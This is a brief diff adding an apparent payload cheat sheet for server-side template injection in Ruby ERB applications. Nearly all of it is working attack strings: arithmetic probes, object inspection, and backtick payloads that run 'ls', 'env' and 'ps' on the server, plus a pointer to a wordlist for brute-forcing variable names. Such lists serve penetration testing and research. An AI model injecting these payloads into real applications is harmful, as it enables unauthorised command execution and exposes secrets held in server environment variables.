@@ -1,0 +1,13 @@
+1) Ruby ERB
+
+"<%=7*7%>"
+<%=%s%>
+<%= self %>
+<%= `ls` %>
+<%= `env` %>
+<%= `ps` %>
+<%=@server%> 
+<%=@instance_variables%>
+<%=server_variables%> 
+
+Brute variables with https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt
